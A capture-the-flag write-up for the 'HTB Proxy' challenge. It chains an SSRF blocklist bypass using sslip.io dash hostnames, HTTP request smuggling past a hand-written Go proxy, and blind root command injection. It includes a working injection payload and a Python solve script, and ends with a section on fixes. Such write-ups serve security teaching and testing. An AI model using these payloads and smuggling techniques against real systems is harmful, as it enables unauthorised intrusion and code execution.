## Overview

HTB Proxy runs two services in one container: a bespoke **Go HTTP proxy** on `:1337` (the only exposed port) that forwards raw requests to whatever `Host` header you supply, and a **Node/Express "network utils" API** on `:5000` that is internal-only and runs as **root**. The flag is renamed to `/flag<10hex>.txt` at boot. Four bugs chain into root RCE — every one of them a place where the hand-written HTTP handling disagrees with how the real backend parses the same bytes.

## The backend bug — blind command injection

`ip-wrapper@1.1.1` builds shell commands with string concatenation:

```js
exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) => { ... })
```

`/flushInterface` feeds user input straight in. The only filter is `interface.includes(" ")` (no spaces). That's [OS command injection](https://cwe.mitre.org/data/definitions/78.html) — but **blind**: `flush()` only rejects when there's `stderr`, and the route returns a generic error, so command output never comes back.

## Gate 1 — reach the internal backend (SSRF filter bypass)

The proxy `net.Dial`s the `Host` header, guarded by a substring blocklist (`localhost`, `0.0.0.0`, `127.`, `172.`, `192.`, `10.`) and `checkIfLocalhost()` = `net.LookupIP(host)` → reject if any resolved IP is loopback ([SSRF](https://cwe.mitre.org/data/definitions/918.html)). The backend listens on `0.0.0.0:5000`, reachable at `127.0.0.1` (loopback → blocked) or the container's own `10.244.x.x` (blocked by the `10.` substring).

The bypass is a **wildcard-DNS dash host**: `10-244-42-117.sslip.io` resolves to `10.244.42.117`, but the *string* contains no blocked substring, and `10.244.x.x` isn't loopback, so `checkIfLocalhost` passes. The proxy then dials its own backend.

> Only the last octet is followed by `.sslip`, so if it's `10/127/172/192` you reintroduce a blocked substring — just restart the instance until the container IP's last octet is safe (~98%). Read the live IP from the unauthenticated `/server-status`.

## Gate 2 — reach /flushInterface (URL filter → request smuggling)

The proxy blocks any URL containing `flushinterface`. URL-encoding (`/flush%49nterface`) fails — Express matches routes on the **raw, still-encoded** path, so it 404s. Instead, [HTTP request smuggling](https://cwe.mitre.org/data/definitions/444.html): the proxy validates only the *first* request line's URL and only runs its body filter on `bodySplit[1]` (the bytes between the 1st and 2nd `\r\n\r\n`), yet forwards **all** raw bytes. Send a benign `POST /x` whose body is clean filler, then a second `\r\n\r\n`, then a smuggled `POST /flushInterface`. Node keep-alive parses and runs the smuggled request — which the proxy never inspected.

## Gate 3 — body filter + blind exfil

`checkMaliciousBody` blocks `` `;&| ``, `$(...)`, and literal CR/LF — but only on the benign filler (`bodySplit[1]`), never on the smuggled request, so the injection can use `;` freely. Spaces (blocked by the backend) become `${IFS}`. Since the RCE is blind, exfiltrate by **copying the flag over the proxy-served static file**, then read it with a plain `GET /`:

```
{"interface":"x;cat${IFS}/flag*.txt>/app/proxy/includes/index.html"}
```

## Solution

`solve.py <host> <port> <container_ip>` builds the smuggled request:

```python
backend = CIP.replace('.', '-') + '.sslip.io:5000'                # gate 1
inj = b'{"interface":"x;cat${IFS}/flag*.txt>/app/proxy/includes/index.html"}'
smuggled = b'POST /flushInterface HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s' % (len(inj), inj)
part1 = b'aaaa'                                                   # req1 body == Content-Length, clean
req = b'POST /x HTTP/1.1\r\nHost: %b\r\nContent-Length: %d\r\n\r\n%b\r\n\r\n%b' % (backend.encode(), len(part1), part1, smuggled)
send(req)                                                        # gates 2+3 -> root cmdi -> flag into index.html
print(re.search(rb'HTB\{[^}]*\}', send(b'GET / HTTP/1.1\r\nHost: x.com:80\r\n\r\n')))
```

Reading `GET /` returns the flag `HTB{...}` (redacted).

## Why it worked

Re-implementing HTTP parsing by hand — `strings.Split` on `\r\n\r\n`, substring blocklists, a `Host`-driven dial — diverges from how the real backend frames the same bytes. That parser-differential is exactly what enables both the SSRF-filter bypass and the request smuggling. The flag says it plainly: *reinventing the wheel sucks.*

## Fix / defense

- Never build shell strings from input — use `execFile('ip', ['address','flush','dev',iface])` (no shell) and validate `iface` with `^[a-z0-9]+$`.
- Don't write your own HTTP proxy/parser; use a vetted library, enforce a single canonical request framing, and reject ambiguous or trailing bytes.
- For SSRF: resolve the host once and connect to *that* resolved IP, rejecting private/loopback ranges after resolution — match the resolved IP, not the string, and close the check-then-dial gap.
